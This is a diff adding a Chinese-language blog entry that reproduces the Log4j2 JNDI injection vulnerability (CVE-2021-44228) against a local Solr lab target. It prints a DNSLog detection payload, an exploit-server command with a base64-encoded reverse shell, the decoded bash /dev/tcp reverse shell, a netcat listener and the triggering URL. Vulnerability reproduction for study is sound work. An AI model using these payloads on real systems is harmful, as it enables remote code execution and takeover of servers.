@@ -4,6 +4,39 @@
   
   
   <entry>
+    <title>(CVE-2021-44228)Apache-Log4j2-JNDI注入-远程代码执行漏洞</title>
+    <link href="/2024/07/26/CVE-2021-44228-Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2024/07/26/CVE-2021-44228-Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h1 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h1><p>Apache Log4j 2是一个开源的日志记录组件，使用非常的广泛。在工程中以易用方便代替了 System.out 等打印语句，它是JAVA下最流行的日志输入工具。</p><p>使用 Log4j 2 在一定场景条件下处理恶意数据时，可能会造成注入类代码执行。</p><h1 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h1><p>Apache log4j2 &gt;&#x3D; 2.0, &lt;&#x3D; 2.14.1</p><p>Apache Log4j 2.0-beta9 - 2.12.1 、Apache Log4j 2.13.0 - 2.15.0-rc1</p><h1 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h1><h2 id="3-1-漏洞分析"><a href="#3-1-漏洞分析" class="headerlink" title="3.1 漏洞分析"></a>3.1 漏洞分析</h2><p>使用 DNSLog 平台获取一个子域名进行jndi注入点测试</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407262141923.png" alt="image-20240726214110819"></p><p>注入检测，获取到 Java 版本号，检测是否存在jndi注入远程代码执行漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.j6zzen.dnslog.cn&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407262141423.png" alt="image-20240726214117388"></p><p>根据上述输出子域名刷新记录可知确实存在jndi注入，远程代码执行漏洞；</p><h2 id="3-2-攻击脚本"><a href="#3-2-攻击脚本" class="headerlink" title="3.2 攻击脚本"></a>3.2 攻击脚本</h2><p>使用工具部署jndi服务<a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ4LjEyOC81NTU1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A 192.168.48.128 <br></code></pre></td></tr></table></figure><p>执行的命令为经过编码的反弹shell的命令<a href="https://ares-x.com/tools/runtime-exec">RUNTIME.EXEC PAYLOAD GENERATER</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.48.128/5555 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407262149062.png" alt="image-20240726214931013"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407262149571.png" alt="image-20240726214952542"></p><p>由于刚才获得的java版本是1.8，所以我们使用JDK1.8的target环境</p><p>在监听机中进行端口监听，等待shell反弹；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 5555<br></code></pre></td></tr></table></figure><p>进行链接访问反弹shell获取root全新啊</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:8983/solr/admin/cores?action=<span class="hljs-variable">$&#123;jndi:ldap://192.168.48.128:1389/vcnt4s&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407262152772.png" alt="image-20240726215222737"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透学习</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web攻防</tag>
+      
+      <tag>cve复现</tag>
+      
+      <tag>漏洞复现</tag>
+      
+      <tag>log4j</tag>
+      
+      <tag>jndi</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>vulfocus靶场搭建教程</title>
     <link href="/2024/07/16/vulfocus%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"/>
     <url>/2024/07/16/vulfocus%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
